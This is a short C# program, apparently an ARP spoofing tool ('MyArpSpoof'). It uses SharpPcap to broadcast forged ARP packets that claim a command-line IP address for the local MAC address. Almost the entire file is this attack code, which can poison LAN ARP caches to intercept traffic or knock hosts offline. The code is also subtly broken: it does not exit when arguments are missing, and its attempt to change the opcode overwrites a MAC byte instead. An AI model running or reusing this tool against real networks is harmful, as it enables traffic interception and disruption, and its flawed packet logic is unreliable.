using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using Tamir.IPLib;
using Tamir.IPLib.Packets;
using Tamir.IPLib.Util;


namespace MyArpSpoof
{
    class Program
    {

        
        static void Main(string[] args)
        {

            PcapDeviceList devs = Tamir.IPLib.SharpPcap.GetAllDevices();
            

            if (args.Length < 2)
            {
                int j = 0;
                foreach (PcapDevice p in devs)
                {
                    System.Console.WriteLine(j++.ToString()+" "+p.PcapName);
                }
                
            
            }
            PcapDevice pdev = devs[System.Convert.ToInt32(args[0])];
            pdev.PcapOpen();

            NetworkDevice dev = new NetworkDevice(pdev.PcapName);

            #region ARP - Header erzeugen
            ARPPacket arp = new ARPPacket(14, new byte[60]);
            arp.ARPHwLength = 6;
            
            arp.ARPHwType = 1;
			arp.ARPProtocolLength = 4;
            arp.ARPProtocolType = ARPFields_Fields.ARP_IP_ADDR_CODE;
            arp.ARPSenderHwAddress = dev.MacAddress;
            arp.ARPSenderProtoAddress = args[1];
            arp.SourceHwAddress = dev.MacAddress;
            arp.ARPTargetHwAddress = dev.MacAddress;
            arp.ARPTargetProtoAddress = args[1];
            arp.DestinationHwAddress = "ff:ff:ff:ff:ff:ff";

            

            byte [] bytes = arp.Bytes;

            #region irgendwie spinnt er arp - mechanismus . .. darum hier manuell nochmal über die bytes

            int i = 12;
            // ARP - Kennung
            bytes[i++] = 0x08;
            bytes[i++] = 0x06;


            bytes[i++] = 0x00;
            bytes[i++] = 0x01;
            

            bytes[i++] = 0x08;
            bytes[i++] = 0x00;

            bytes[i++] = 0x06;
            bytes[i++] = 0x04;

            bytes[i++] = 0x00;
            bytes[i++] = 0x02;
            // 1.. request , 2.. response

            #endregion

            byte [] req = (byte []) bytes.Clone();

            bytes[i] = 0x01;

            byte[] response = (byte[]) bytes.Clone();

            #endregion ARP - Header erzeugen
            
            // von heartbeat abgeschaut

            pdev.PcapSendPacket(req);            
            pdev.PcapSendPacket(response);
            System.Threading.Thread.Sleep(10);
            pdev.PcapSendPacket(req);            
            pdev.PcapSendPacket(response);
            System.Threading.Thread.Sleep(10);
            pdev.PcapSendPacket(req);            
            pdev.PcapSendPacket(response);
            System.Threading.Thread.Sleep(10);
            pdev.PcapSendPacket(req);
            pdev.PcapSendPacket(response);                                  
        }
    }
}
